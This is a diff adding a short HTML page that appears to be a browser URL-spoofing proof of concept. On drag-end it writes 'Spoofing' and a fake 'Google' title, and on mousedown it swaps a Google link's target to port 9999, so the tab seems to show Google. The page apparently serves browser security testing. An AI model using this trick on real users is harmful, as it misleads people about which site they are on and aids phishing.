@@ -1,0 +1,15 @@
+<script>
+    document.addEventListener("dragend", function () {
+        document.write('<b>Spoofing</b>');
+        document.write('<title>Google</title>');
+    });
+
+    function ee() {
+        document.getElementById('bb').setAttribute('href', 'https://www.google.com:9999');
+    }
+</script>
+
+<p>
+    Drag and drop links to the current TAB.
+</p>
+<a id='bb' onmousedown="ee()" href="https://www.google.com/">www.google.com</a>
